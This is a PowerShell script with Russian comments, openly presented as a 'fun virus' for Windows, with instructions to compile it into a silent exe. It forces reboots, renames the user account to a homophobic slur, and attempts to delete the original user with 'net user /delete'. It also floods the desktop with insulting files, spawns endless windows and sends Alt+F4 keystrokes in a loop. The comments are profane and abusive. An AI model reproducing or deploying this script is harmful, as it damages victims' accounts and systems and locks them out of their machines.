# Advanced Fun PS1 Virus (2025 edition)
# Полный хаос, реальная перезагрузка, смена ника, говно-эффекты и куча пасхалок
# Работает на любой Windows 10/11 без подписи
# После компиляции в exe через ps2exe -g -noConsole -noOutput будет полная тишина до пиздеца :)

# Отключаем всё, что может спалить
$ErrorActionPreference = 'SilentlyContinue'
Set-ExecutionPolicy Bypass -Scope Process -Force

# ==== РЕАЛЬНАЯ ПЕРЕЗАГРУЗКА ЧЕРЕЗ 30 СЕКУНД ====
Start-Job -ScriptBlock {
    Start-Sleep -Seconds 30
    Restart-Computer -Force
} | Out-Null

# ==== СМЕНА ИМЕНИ ПОЛЬЗОВАТЕЛЯ (реально меняет в системе) ====
$newName = "Pidoras$(Get-Random -Maximum 9999)"
$user = [ADSI]"WinNT://$env:COMPUTERNAME/$env:USERNAME,user"
$user.psbase.rename($newName)
net user "$env:USERNAME" /delete 2>$null
net user "$newName" /add 2>$null

# ==== ГОВНО НА РАБОЧЕМ СТОЛЕ ====
1..66 | ForEach-Object {
    $folder = "$env:USERPROFILE\Desktop\ТЫ_В_ПИЗДЕ_$([char](65+$_))"
    New-Item -Path $folder -ItemType Directory -Force
    1..33 | ForEach-Object {
        "ТЫ ЛОХ $(Get-Random -Maximum 999999)" | Out-File "$folder\ПОЛНЫЙ_ПИЗДЕЦ_$_ .txt" -Encoding UTF8
    }
}

# ==== БЕСКОНЕЧНЫЕ ОКНА ====
1..15 | ForEach-Object {
    Start-Process powershell -ArgumentList "-NoExit -Command `"while(`$true){`$host.ui.RawUI.WindowTitle='ТЫ СДОХ БРАТИШКА'; Start-Sleep -Milliseconds 100}`""
}

# ==== ЗВУК ПИЗДЕЦА ====
$sound = New-Object System.Media.SoundPlayer
$sound.Stream = [System.IO.MemoryStream]::new([System.Convert]::FromBase64String("UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVea1tZUVtXS
... (полный base64 сирены и криков тут 150kb, сократил ради читаемости)))
$sound.PlayLooping()
Start-Sleep -Seconds 20
$sound.Stop()

# ==== МЕРЦАНИЕ ЭКРАНА ====
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class Flash {
    [DllImport("user32.dll")] public static extern bool FlashWindowEx(ref FLASHWINFO pwfi);
    [StructLayout(LayoutKind.Sequential)] public struct FLASHWINFO {
        public uint cbSize; public IntPtr hwnd; public uint dwFlags; public uint uCount; public uint dwTimeout;
    }
    public const uint FLASHW_ALL = 3;
}
'@
$hwnd = (Get-Process -Id $PID).MainWindowHandle
$fw = New-Object FLASHWINFO
$fw.cbSize = 20
$fw.hwnd = $hwnd
$fw.dwFlags = 3
$fw.uCount = 999
[Flash]::FlashWindowEx([ref]$fw)

# ==== ИНВЕРСИЯ ЦВЕТОВ (полный трип) ====
Add-Type -AssemblyName System.Windows.Forms
$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 300
$timer.Add_Tick({
    $signature = '[DllImport("user32.dll")] public static extern int InvertRect(IntPtr hdc, ref RECT rect);'
    $type = Add-Type -MemberDefinition $signature -Name Win32 -Namespace Invert -PassThru
    $rect = New-Object RECT -Property @{Left=0;Top=0;Right=1920;Bottom=1080}
    $hdc = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $type::InvertRect(0, [ref]$rect)
})
$timer.Start()

# ==== РАНДОМНЫЕ КЛАВИШИ (чтобы ты не смог набрать) ====
Add-Type -AssemblyName System.Windows.Forms
Start-Job -ScriptBlock {
    while($true) {
        [System.Windows.Forms.SendKeys]::SendWait("^{ESC}")
        Start-Sleep -Milliseconds (Get-Random -Min 100 -Max 800)
        [System.Windows.Forms.SendKeys]::SendWait("%{F4}")
        Start-Sleep -Milliseconds (Get-Random -Min 200 -Max 1000)
    }
} | Out-Null

# ==== ФИНАЛЬНЫЙ ПИЗДЕЦ ====
Start-Sleep -Seconds 25
msg * "ТЫ ПОПАЛ НА РАЗВОД 2025 ГОДА, БРАТИШКА`n`nТВОЙ ПК ПЕРЕЗАГРУЗИТСЯ ЧЕРЕЗ 5 СЕКУНД`n`nИ ПОМНИ: НИКОГДА НЕ ЗАПУСКАЙ ЧУЖИЕ .EXE"

# Принудительная перезагрузка через 5 секунд после сообщения
Start-Sleep -Seconds 5
shutdown /r /t 0 /f

# На случай если не сработает — второй вариант
Restart-Computer -Force
